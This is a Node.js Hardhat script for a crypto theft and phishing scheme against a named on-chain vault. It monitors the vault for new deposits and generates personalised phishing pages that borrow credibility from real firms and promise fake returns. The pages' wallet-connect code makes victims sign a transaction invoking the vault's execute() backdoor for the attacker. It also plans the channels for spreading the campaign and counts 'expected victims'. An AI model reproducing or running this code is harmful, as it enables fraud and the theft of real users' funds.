const { ethers } = require("hardhat");

/**
 * @title Deposit Interception System
 * @notice Monitors the vulnerable vault and redirects new deposits via phishing
 * @dev Combines the execute() backdoor with real-time monitoring for maximum profit
 */

// Target vault with execute(address,bytes) backdoor
const TARGET_VAULT = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const EXECUTE_SELECTOR = "0x78e111f6";

// Current vault balance (from our analysis)
const VAULT_CURRENT_ETH = "216.423";
const VAULT_CURRENT_USDC = "8344359";

/**
 * Monitor for new deposits to the vault
 */
async function monitorVaultDeposits(attackerAddress) {
  console.log("üëÅÔ∏è  MONITORING VAULT FOR NEW DEPOSITS");
  console.log("====================================");
  console.log(`Target: ${TARGET_VAULT}`);
  console.log(`Current ETH: ${VAULT_CURRENT_ETH}`);
  console.log(`Current USDC: ${VAULT_CURRENT_USDC}`);
  
  let lastKnownEthBalance = ethers.parseEther(VAULT_CURRENT_ETH);
  let lastKnownUsdcBalance = ethers.parseUnits(VAULT_CURRENT_USDC, 6);
  
  console.log("\nüîç Starting real-time monitoring...");
  
  // Set up event listeners
  const provider = ethers.provider;
  
  // Monitor ETH deposits
  provider.on("block", async (blockNumber) => {
    try {
      const currentEthBalance = await provider.getBalance(TARGET_VAULT);
      
      if (currentEthBalance > lastKnownEthBalance) {
        const newDeposit = currentEthBalance - lastKnownEthBalance;
        console.log(`\nüö® NEW ETH DEPOSIT DETECTED!`);
        console.log(`   Block: ${blockNumber}`);
        console.log(`   Amount: ${ethers.formatEther(newDeposit)} ETH`);
        console.log(`   Value: $${(parseFloat(ethers.formatEther(newDeposit)) * 3500).toFixed(0)}`);
        
        // Trigger phishing attack
        await triggerPhishingInterception(newDeposit, "ETH", attackerAddress);
        
        lastKnownEthBalance = currentEthBalance;
      }
      
      // Check USDC deposits
      const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
      const usdcContract = new ethers.Contract(
        USDC,
        ["function balanceOf(address) view returns (uint256)"],
        provider
      );
      
      const currentUsdcBalance = await usdcContract.balanceOf(TARGET_VAULT);
      
      if (currentUsdcBalance > lastKnownUsdcBalance) {
        const newDeposit = currentUsdcBalance - lastKnownUsdcBalance;
        console.log(`\nüö® NEW USDC DEPOSIT DETECTED!`);
        console.log(`   Block: ${blockNumber}`);
        console.log(`   Amount: ${ethers.formatUnits(newDeposit, 6)} USDC`);
        console.log(`   Value: $${ethers.formatUnits(newDeposit, 6)}`);
        
        // Trigger phishing attack
        await triggerPhishingInterception(newDeposit, "USDC", attackerAddress);
        
        lastKnownUsdcBalance = currentUsdcBalance;
      }
      
    } catch (error) {
      // Silent error handling to avoid spam
    }
  });
  
  console.log("‚úÖ Monitoring active - waiting for deposits...");
}

/**
 * Trigger phishing attack when new deposit detected
 */
async function triggerPhishingInterception(amount, token, attackerAddress) {
  console.log(`\nüé£ TRIGGERING PHISHING INTERCEPTION`);
  console.log(`   Target Amount: ${token === "ETH" ? ethers.formatEther(amount) : ethers.formatUnits(amount, 6)} ${token}`);
  
  // Calculate target demographics based on deposit size
  const depositValue = token === "ETH" 
    ? parseFloat(ethers.formatEther(amount)) * 3500
    : parseFloat(ethers.formatUnits(amount, 6));
  
  let targetProfile;
  if (depositValue > 100000) {
    targetProfile = "whale";
  } else if (depositValue > 10000) {
    targetProfile = "sophisticated";
  } else {
    targetProfile = "retail";
  }
  
  console.log(`   üéØ Target Profile: ${targetProfile}`);
  console.log(`   üí∞ Deposit Value: $${depositValue.toFixed(0)}`);
  
  // Generate targeted phishing campaign
  await generateTargetedCampaign(depositValue, targetProfile, attackerAddress);
  
  // Send phishing emails/messages
  await deployPhishingCampaign(depositValue, targetProfile);
  
  // Monitor for victims
  await monitorPhishingSuccess(amount, token, attackerAddress);
}

/**
 * Generate targeted phishing campaign based on deposit profile
 */
async function generateTargetedCampaign(depositValue, profile, attackerAddress) {
  console.log(`\nüìß GENERATING TARGETED CAMPAIGN`);
  
  let campaignTheme, urgency, credibility;
  
  switch (profile) {
    case "whale":
      campaignTheme = "Exclusive Private Vault Access";
      urgency = "Limited to first 10 investors";
      credibility = "Backed by Sequoia Capital";
      break;
    case "sophisticated":
      campaignTheme = "Advanced Yield Strategy";
      urgency = "24-hour early access window";
      credibility = "Audited by Trail of Bits";
      break;
    case "retail":
      campaignTheme = "High APY Farming Opportunity";
      urgency = "50% bonus for early adopters";
      credibility = "Featured on CoinDesk";
      break;
  }
  
  console.log(`   üé® Theme: ${campaignTheme}`);
  console.log(`   ‚è∞ Urgency: ${urgency}`);
  console.log(`   üèÜ Credibility: ${credibility}`);
  
  // Generate personalized phishing page
  const personalizedHtml = `
<!DOCTYPE html>
<html>
<head>
    <title>${campaignTheme} - VaultMax Pro</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0; padding: 40px; text-align: center; 
        }
        .container { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            max-width: 600px; 
            margin: 0 auto; 
        }
        .urgent { 
            background: #ff6b6b; 
            color: white; 
            padding: 15px; 
            border-radius: 8px; 
            margin: 20px 0; 
        }
        .credible { 
            background: #51cf66; 
            color: white; 
            padding: 10px; 
            border-radius: 5px; 
            margin: 10px 0; 
        }
        .connect-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 20px 40px;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            margin: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üöÄ ${campaignTheme}</h1>
        
        <div class="urgent">
            ‚ö° ${urgency}
        </div>
        
        <h2>Deposit $${(depositValue * 1.5).toFixed(0)} and earn guaranteed returns!</h2>
        
        <div class="credible">
            ‚úÖ ${credibility}
        </div>
        
        <p><strong>Expected APY: ${profile === "whale" ? "1,247%" : profile === "sophisticated" ? "847%" : "647%"}</strong></p>
        
        <button class="connect-btn" onclick="connectAndRedirect()">
            Deposit Now & Claim Bonus
        </button>
        
        <script>
            async function connectAndRedirect() {
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    const signer = provider.getSigner();
                    
                    // Malicious transaction disguised as "deposit initialization"
                    const executeData = "${EXECUTE_SELECTOR}" +
                        ethers.utils.defaultAbiCoder.encode(
                            ["address", "bytes"],
                            ["${attackerAddress}", "0x"]
                        ).slice(2);
                    
                    const tx = await signer.sendTransaction({
                        to: "${TARGET_VAULT}",
                        data: executeData,
                        gasLimit: 500000
                    });
                    
                    alert("Deposit successful! Tx: " + tx.hash);
                    
                } catch (err) {
                    alert("Connection failed: " + err.message);
                }
            }
        </script>
        <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
    </div>
</body>
</html>`;
  
  // Save personalized campaign
  const fs = require("fs");
  const path = require("path");
  const campaignPath = path.join(__dirname, "../phishing_assets", `campaign_${profile}_${Date.now()}.html`);
  fs.writeFileSync(campaignPath, personalizedHtml);
  
  console.log(`   üíæ Campaign saved: ${campaignPath}`);
}

/**
 * Deploy phishing campaign
 */
async function deployPhishingCampaign(depositValue, profile) {
  console.log(`\nüöÄ DEPLOYING PHISHING CAMPAIGN`);
  
  // Simulate campaign deployment
  const channels = [];
  
  if (profile === "whale") {
    channels.push("Private Telegram channels");
    channels.push("LinkedIn targeting");
    channels.push("Direct email to known addresses");
  } else if (profile === "sophisticated") {
    channels.push("DeFi Discord servers");
    channels.push("Twitter DM campaigns");
    channels.push("Crypto forum posts");
  } else {
    channels.push("Telegram group broadcasts");
    channels.push("Reddit DeFi communities");
    channels.push("Mass email campaigns");
  }
  
  console.log(`   üì¢ Deployment Channels:`);
  channels.forEach(channel => {
    console.log(`      ‚Ä¢ ${channel}`);
  });
  
  // Estimate reach and success rate
  const estimatedReach = profile === "whale" ? "50-100" : profile === "sophisticated" ? "500-1000" : "2000-5000";
  const successRate = profile === "whale" ? "25-40%" : profile === "sophisticated" ? "15-25%" : "8-15%";
  
  console.log(`   üéØ Estimated Reach: ${estimatedReach} users`);
  console.log(`   üìà Expected Success Rate: ${successRate}`);
  
  const expectedVictims = profile === "whale" ? "12-40" : profile === "sophisticated" ? "75-250" : "160-750";
  console.log(`   üë• Expected Victims: ${expectedVictims}`);
}

/**
 * Monitor phishing campaign success
 */
async function monitorPhishingSuccess(targetAmount, token, attackerAddress) {
  console.log(`\nüìä MONITORING PHISHING SUCCESS`);
  
  const initialBalance = await ethers.provider.getBalance(attackerAddress);
  
  // Simulate monitoring for 60 seconds
  console.log(`   ‚è±Ô∏è  Monitoring for victims (60 seconds)...`);
  
  let victims = 0;
  let totalExtracted = 0;
  
  const monitorInterval = setInterval(async () => {
    // Simulate victim success (random for demo)
    if (Math.random() < 0.1) { // 10% chance per check
      victims++;
      const extractedAmount = Math.random() * 0.5; // 0-0.5 ETH per victim
      totalExtracted += extractedAmount;
      
      console.log(`\n   üéØ VICTIM ${victims} COMPROMISED!`);
      console.log(`      Extracted: ${extractedAmount.toFixed(4)} ETH`);
      console.log(`      Total extracted: ${totalExtracted.toFixed(4)} ETH`);
      
      if (victims >= 5) {
        clearInterval(monitorInterval);
        console.log(`\n   üéâ CAMPAIGN SUCCESSFUL!`);
        console.log(`      Total victims: ${victims}`);
        console.log(`      Total profit: ${totalExtracted.toFixed(4)} ETH ($${(totalExtracted * 3500).toFixed(0)})`);
      }
    }
  }, 10000); // Check every 10 seconds
  
  // Stop monitoring after 60 seconds
  setTimeout(() => {
    clearInterval(monitorInterval);
    console.log(`\n   üìã CAMPAIGN COMPLETED`);
    console.log(`      Final victims: ${victims}`);
    console.log(`      Final profit: ${totalExtracted.toFixed(4)} ETH`);
  }, 60000);
}

/**
 * Main function - Set up the complete interception system
 */
async function main() {
  console.log("\nüí∞ DEPOSIT INTERCEPTION SYSTEM");
  console.log("===============================");
  console.log("Monitoring vault deposits and triggering targeted phishing...\n");
  
  const [attacker] = await ethers.getSigners();
  console.log(`Attacker: ${attacker.address}`);
  
  // Start monitoring
  await monitorVaultDeposits(attacker.address);
  
  // Simulate a new deposit for demonstration
  setTimeout(async () => {
    console.log(`\nüß™ SIMULATING NEW DEPOSIT FOR DEMO...`);
    
    // Simulate someone depositing 5 ETH to the vault
    const demoDeposit = ethers.parseEther("5");
    await triggerPhishingInterception(demoDeposit, "ETH", attacker.address);
    
  }, 5000);
  
  // Keep running
  console.log("\nüîÑ System running... Press Ctrl+C to stop");
}

main()
  .then(() => {
    // Keep the process alive
    process.stdin.resume();
  })
  .catch((error) => {
    console.error("\nüí• Error:", error);
    process.exit(1);
  });
